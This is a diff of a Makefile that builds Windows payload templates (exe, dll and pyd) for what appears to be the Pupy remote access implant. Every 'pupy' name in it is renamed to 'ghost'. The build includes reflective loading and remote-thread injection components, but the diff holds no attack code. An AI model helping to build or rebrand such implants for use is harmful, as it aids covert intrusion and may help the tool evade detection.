@@ -6,7 +6,7 @@ SUFFIX ?= -$(PYMAJ)$(PYMIN).
 BITS ?= 32
 
 
-TEMPLATE_OUTPUT_PATH=../../pupy/payload_templates
+TEMPLATE_OUTPUT_PATH=../../ghost/payload_templates
 
 ifndef ARCH
 $(error You must specify an architecture - 64 or 32)
@@ -67,14 +67,14 @@ COMMON_OBJS := \
 	MemoryModule.obj
 
 LOADER_OBJS := \
-	pupy_load.obj
+	ghost_load.obj
 
-PUPY_MODULE := \
+GHOST_MODULE := \
 	base_inject.obj \
 	thread.obj remote_thread.obj \
 	LoadLibraryR.obj \
 	ReflectiveLoader.obj \
-	pupy.obj
+	ghost.obj
 
 SHARED_OBJS := \
 	main_reflective.obj
@@ -84,15 +84,15 @@ APP_OBJS := \
 
 
 ifneq ($(FEATURE_DYNLOAD),)
-CFLAGS += /D_PUPY_DYNLOAD /D_PUPY_PRIVATE_NT
-#CFLAGS += /D_PUPY_DYNLOAD
+CFLAGS += /D_GHOST_DYNLOAD /D_GHOST_PRIVATE_NT
+#CFLAGS += /D_GHOST_DYNLOAD
 SHARED_OBJS += ReflectiveLoader.obj
 LIBPYTHON_LIBS := $(PYTHONPATH)\\libs\\python$(PYMAJ)$(PYMIN).lib advapi32.lib
 LIBPYTHON_INC := /I$(PYTHONPATH)\\include
 
 else
-SHARED_OBJS += $(PUPY_MODULE)
-APP_OBJS += $(PUPY_MODULE)
+SHARED_OBJS += $(GHOST_MODULE)
+APP_OBJS += $(GHOST_MODULE)
 endif
 
 ifneq ($(FEATURE_POSTMORTEM),)
@@ -100,15 +100,15 @@ CFLAGS += /DPOSTMORTEM
 endif
 
 ifneq ($(DEBUG),)
-PUPY_PYD := _pupy_debug.pyd
+GHOST_PYD := _ghost_debug.pyd
 COMMON_OBJS += debug.obj
-PUPY_MODULE += debug.obj
+GHOST_MODULE += debug.obj
 else
-PUPY_PYD := _pupy.pyd
+GHOST_PYD := _ghost.pyd
 endif
 
-PUPY_PYD_C := $(PUPY_PYD:%.pyd=%_pyd.c)
-PUPY_PYD_LOADER := $(PUPY_PYD_C:%.c=%.loader)
+GHOST_PYD_C := $(GHOST_PYD:%.pyd=%_pyd.c)
+GHOST_PYD_LOADER := $(GHOST_PYD_C:%.c=%.loader)
 
 ifeq ($(UNCOMPRESSED),)
 COMMON_OBJS += LzmaDec.obj
@@ -119,8 +119,8 @@ SUFFIX := unc-$(SUFFIX)
 COMPRESSED = 0
 endif
 
-PUPY_LOAD_DEPS := \
-	pupy_load.c \
+GHOST_LOAD_DEPS := \
+	ghost_load.c \
 	resources/$(ARCH)/library.c \
 	resources/$(ARCH)/vcruntime140.c \
 	resources/$(ARCH)/python3.c \
@@ -130,14 +130,14 @@ PUPY_LOAD_DEPS := \
 	import-tab.c revision.h
 
 TARGETS := \
-	$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH)$(SUFFIX)exe \
-	$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH)$(SUFFIX)dll
+	$(TEMPLATE_OUTPUT_PATH)/ghost$(PPARCH)$(SUFFIX)exe \
+	$(TEMPLATE_OUTPUT_PATH)/ghost$(PPARCH)$(SUFFIX)dll
 
 REQUIRED_LIBS := user32.lib
 
 ifneq ($(FEATURE_DYNLOAD),)
-	TARGETS += $(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH)$(SUFFIX)pyd
-	PUPY_LOAD_DEPS += resources/$(ARCH)/$(PUPY_PYD_C)
+	TARGETS += $(TEMPLATE_OUTPUT_PATH)/ghost$(PPARCH)$(SUFFIX)pyd
+	GHOST_LOAD_DEPS += resources/$(ARCH)/$(GHOST_PYD_C)
 else
 	REQUIRED_LIBS += advapi32.lib
 endif
@@ -145,7 +145,7 @@ endif
 all: $(TARGETS)
 
 
-pyd: $(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH)$(SUFFIX)pyd
+pyd: $(TEMPLATE_OUTPUT_PATH)/ghost$(PPARCH)$(SUFFIX)pyd
 
 revision.h:
 	if [ -z $$COMMIT ]; then rev=$$(cat ../../.git/`cat ../../.git/HEAD | cut -f 2 -d \ ` | cut -c 1-8); \
@@ -198,8 +198,8 @@ resources/$(ARCH)/python3.c: resources/$(ARCH)/python$(PYMAJ)$(PYMIN).dll ../gen
 resources/$(ARCH)/vcruntime140.c: resources/$(ARCH)/vcruntime140.dll ../gen_resource_header.py
 	$(HOST_PYTHON) ../gen_resource_header.py $< $@ $(COMPRESSED) $(SECARGS)
 
-resources/$(ARCH)/$(PUPY_PYD_C): $(PUPY_PYD) ../gen_resource_header.py
-	$(HOST_PYTHON) ../gen_resource_header.py $< resources/$(ARCH)/$(PUPY_PYD_C) $(COMPRESSED) $(SECARGS)
+resources/$(ARCH)/$(GHOST_PYD_C): $(GHOST_PYD) ../gen_resource_header.py
+	$(HOST_PYTHON) ../gen_resource_header.py $< resources/$(ARCH)/$(GHOST_PYD_C) $(COMPRESSED) $(SECARGS)
 
 ReflectiveLoader.obj:	ReflectiveLoader.c
 	#$(CC) /Fo$@ /c $(CFLAGS) /O2 /Ob1  $<
@@ -217,26 +217,26 @@ endif
 	$(CC) /Fo$@ /c $(LIBPYTHON_INC) $(CFLAGS) $(CFLAGS_OPT) $<
 
 
-pupy_load.obj: $(PUPY_LOAD_DEPS)
+ghost_load.obj: $(GHOST_LOAD_DEPS)
 
-$(PUPY_PYD): $(PUPY_MODULE) $(COMMON_OBJS) | revision.h
-	$(CC) $(CFLAGS) $(CFLAGS_OPT) $^ /Fe$@ /LD $(LIBPYTHON_LIBS) /link /MAP:$(PUPY_PYD).map
+$(GHOST_PYD): $(GHOST_MODULE) $(COMMON_OBJS) | revision.h
+	$(CC) $(CFLAGS) $(CFLAGS_OPT) $^ /Fe$@ /LD $(LIBPYTHON_LIBS) /link /MAP:$(GHOST_PYD).map
 
-$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH)$(SUFFIX)exe: $(APP_OBJS) $(COMMON_OBJS) $(LOADER_OBJS)
+$(TEMPLATE_OUTPUT_PATH)/ghost$(PPARCH)$(SUFFIX)exe: $(APP_OBJS) $(COMMON_OBJS) $(LOADER_OBJS)
 	$(CC) $(CFLAGS) $(CFLAGS_OPT) $+ \
-		/Fe$(TEMPLATE_OUTPUT_PATH)/exe_pupy$(PPARCH)$(SUFFIX)exe $(LINKER_OPTS) $(REQUIRED_LIBS)
-	mv $(TEMPLATE_OUTPUT_PATH)/exe_pupy$(PPARCH)$(SUFFIX)exe $@
+		/Fe$(TEMPLATE_OUTPUT_PATH)/exe_ghost$(PPARCH)$(SUFFIX)exe $(LINKER_OPTS) $(REQUIRED_LIBS)
+	mv $(TEMPLATE_OUTPUT_PATH)/exe_ghost$(PPARCH)$(SUFFIX)exe $@
 	unzip -p resources/$(ARCH)/library.zip fid.toc >$@.toc
 
-$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH)$(SUFFIX)dll: $(SHARED_OBJS) $(COMMON_OBJS) $(LOADER_OBJS)
+$(TEMPLATE_OUTPUT_PATH)/ghost$(PPARCH)$(SUFFIX)dll: $(SHARED_OBJS) $(COMMON_OBJS) $(LOADER_OBJS)
 	$(CC) $(CFLAGS) $(CFLAGS_OPT) $+ \
-		/Fe$(TEMPLATE_OUTPUT_PATH)/dll_pupy$(PPARCH)$(SUFFIX)dll /LD $(REQUIRED_LIBS)
-	mv $(TEMPLATE_OUTPUT_PATH)/dll_pupy$(PPARCH)$(SUFFIX)dll $@
+		/Fe$(TEMPLATE_OUTPUT_PATH)/dll_ghost$(PPARCH)$(SUFFIX)dll /LD $(REQUIRED_LIBS)
+	mv $(TEMPLATE_OUTPUT_PATH)/dll_ghost$(PPARCH)$(SUFFIX)dll $@
 	unzip -p resources/$(ARCH)/library.zip fid.toc >$@.toc
 
-$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH)$(SUFFIX)pyd: resources/$(ARCH)/$(PUPY_PYD_C) $(PUPY_PYD)
-	cat resources/$(ARCH)/$(PUPY_PYD_LOADER) $(PUPY_PYD) > $@
-	mv $(PUPY_PYD) $@
+$(TEMPLATE_OUTPUT_PATH)/ghost$(PPARCH)$(SUFFIX)pyd: resources/$(ARCH)/$(GHOST_PYD_C) $(GHOST_PYD)
+	cat resources/$(ARCH)/$(GHOST_PYD_LOADER) $(GHOST_PYD) > $@
+	mv $(GHOST_PYD) $@
 
 .PHONY: clean
 
@@ -244,11 +244,11 @@ clean:
 	rm -f \
 		$(COMMON_OBJS) \
 		$(LOADER_OBJS) \
-		$(PUPY_MODULE) \
+		$(GHOST_MODULE) \
 		$(SHARED_OBJS) \
-		$(PUPY_PYD_C) \
+		$(GHOST_PYD_C) \
 		$(APP_OBJS) \
-		$(PUPY_PYD) \
+		$(GHOST_PYD) \
 		*.exp \
 		*.lib \
 		*.map \
